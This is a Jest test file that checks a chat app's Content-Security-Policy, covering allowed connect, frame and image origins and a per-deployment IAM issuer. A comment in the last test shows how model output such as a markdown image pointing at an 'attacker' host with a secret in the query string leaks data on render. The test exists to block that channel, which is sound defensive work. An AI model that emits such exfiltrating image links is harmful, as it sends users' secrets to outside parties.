const { contentSecurityPolicy } = require('./csp');

const directive = (name) =>
  contentSecurityPolicy
    .split('; ')
    .find((d) => d.startsWith(`${name} `))
    ?.slice(name.length + 1);

describe('Content-Security-Policy', () => {
  it('lets the SPA reach IAM, or login never completes', () => {
    // Browser PKCE: discovery + POST /v1/iam/oauth/token happen from the page.
    expect(directive('connect-src')).toContain('https://hanzo.id');
  });

  it('keeps the origins the app actually talks to', () => {
    const connect = directive('connect-src');
    ["'self'", 'https://hanzo.app', 'https://*.hanzo.ai', 'wss://*.hanzo.chat'].forEach((origin) =>
      expect(connect).toContain(origin),
    );
  });

  it('allows same-origin framing only', () => {
    expect(directive('frame-ancestors')).toBe("'self'");
  });

  it('keeps the same-origin audio-unlock iframe working', () => {
    expect(directive('frame-src')).toContain("'self'");
  });

  it('frames the ambient backdrop player, from the YouTube origin only', () => {
    expect(directive('frame-src')).toContain('https://www.youtube.com');
  });

  /**
   * hanzo.id answers `frame-ancestors 'none'` + `X-Frame-Options: DENY`, so it can
   * never be framed and chat no longer tries — the iframe `signinSilent()` flow is
   * gone. Listing the origin here would grant a capability nothing uses.
   */
  it('does not frame IAM, which refuses to be framed anyway', () => {
    expect(directive('frame-src')).not.toContain('hanzo.id');
  });

  /**
   * The regression this pins: written as the literal `https://hanzo.id`, the
   * policy shipped Hanzo's issuer inside an image every brand runs, so lux.chat
   * signed a visitor in at lux.id and then refused its own token POST. Login was
   * impossible there for every account while nothing looked broken.
   */
  describe('the IAM origin is the DEPLOYMENT\'s, not the one that built the image', () => {
    const cspFor = (issuer) => {
      jest.resetModules();
      const previous = process.env.OPENID_ISSUER;
      if (issuer === undefined) {
        delete process.env.OPENID_ISSUER;
      } else {
        process.env.OPENID_ISSUER = issuer;
      }
      const { contentSecurityPolicy: policy } = require('./csp');
      if (previous === undefined) {
        delete process.env.OPENID_ISSUER;
      } else {
        process.env.OPENID_ISSUER = previous;
      }
      return policy;
    };
    const connect = (policy) =>
      policy
        .split('; ')
        .find((d) => d.startsWith('connect-src '))
        .slice('connect-src '.length)
        .split(' ');

    it('lets a Lux deployment reach lux.id, and does not name hanzo.id', () => {
      const sources = connect(cspFor('https://lux.id'));
      expect(sources).toContain('https://lux.id');
      expect(sources).not.toContain('https://hanzo.id');
    });

    it('serves the avatar from that same issuer', () => {
      expect(cspFor('https://lux.id')).toContain('img-src');
      expect(cspFor('https://lux.id')).toContain('https://lux.id');
    });

    it('falls back to hanzo.id when the environment states no issuer', () => {
      expect(connect(cspFor(undefined))).toContain('https://hanzo.id');
    });

    it('normalises an issuer carrying a path or trailing slash to its origin', () => {
      expect(connect(cspFor('https://lux.id/'))).toContain('https://lux.id');
      expect(connect(cspFor('https://lux.id/v1/iam'))).toContain('https://lux.id');
    });

    it('emits a usable policy rather than a broken one for a malformed issuer', () => {
      expect(connect(cspFor('not-a-url'))).toContain('https://hanzo.id');
    });
  });

  it('never opens the door to any origin', () => {
    expect(contentSecurityPolicy).not.toContain('*;');
    expect(directive('connect-src')).not.toContain(' * ');
  });

  it('does not auto-load images from an arbitrary host — no beacon channel', () => {
    // A bare `https:` in img-src is the LLM exfiltration channel: model output
    // ![](https://attacker/p?d=<secret>) fires a GET on render. img-src must
    // name specific hosts, never the whole scheme.
    const img = directive('img-src') ?? '';
    // The bare scheme is a standalone token; `https://s3.hanzo.ai` is not it.
    expect(img.split(' ')).not.toContain('https:');
    expect(img).toContain("'self'");
  });
});
